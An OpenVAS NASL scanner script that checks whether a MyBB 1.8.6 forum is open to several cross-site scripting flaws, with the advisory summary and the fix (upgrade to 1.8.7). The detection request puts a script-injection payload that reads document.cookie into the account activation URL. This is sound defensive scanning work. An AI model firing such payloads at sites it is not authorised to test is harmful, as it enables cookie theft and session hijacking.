###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mybb_mult_xss_vuln.nasl 12149 2018-10-29 10:48:30Z asteins $
#
# MyBB Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################
CPE = "cpe:/a:mybb:mybb";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.809094");
  script_version("$Revision: 12149 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-29 11:48:30 +0100 (Mon, 29 Oct 2018) $");
  script_tag(name:"creation_date", value:"2016-11-15 12:12:12 +0530 (Tue, 15 Nov 2016)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("MyBB Multiple Cross Site Scripting Vulnerabilities");

  script_tag(name:"summary", value:"This host is running MyBB Forum and is
  prone to multiple cross site scripting vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and
  check whether it is able read the cookie or not");

  script_tag(name:"insight", value:"Multiple flaws are due to,

  - The profile editor of the moderator control panel does not properly
    encode the signature of a user when editing it.

  - An admin can allow HTML input for specific forums via the setting
    allowhtml.

  - An insufficient validation of username parameter in registration.

  - The files with extension .attach that contain HTML code can be uploaded and
    are interpreted as HTML files by some default server configurations.

  - The account activation form echoes a given code unencoded to the user.

  - In many of the update scripts including upgrade3.php, upgrade12.php,
    upgrade13.php, upgrade17.php, and upgrade30.php, POST values are echoed
    without proper encoding.

  - A CSS Injection error in 'search.php' script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attacker to create a specially crafted request that would execute arbitrary
  script code in a user's browser session in context of an affected site and
  to bypass csrf protection.");

  script_tag(name:"affected", value:"MyBB version 1.8.6");

  script_tag(name:"solution", value:"Upgrade to MyBB version 1.8.7 or later.");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2016/Nov/57");

  script_tag(name:"solution_type", value:"VendorFix");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("sw_mybb_detect.nasl");
  script_mandatory_keys("MyBB/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"http://www.mybb.com");
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!mybbPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:mybbPort)){
  exit(0);
}

if( dir == "/" ) dir = "";

url = dir + '/member.php?action=activate&uid=-1&code=";><script>alert(document.cookie)<%2fscript>';

if(http_vuln_check(port:mybbPort, url:url, check_header:TRUE,
   pattern:"Powered By.*>MyBB Group",
   extra_check:make_list('<input type="text" class="textbox" name="code" value="";><script>alert\\(document.cookie\\)</script>',
  'Activate Account', '>Portal', '>Member List')))
{
  report = report_vuln_url(port:mybbPort, url:url);
  security_message(port:mybbPort, data:report);
  exit(0);
}
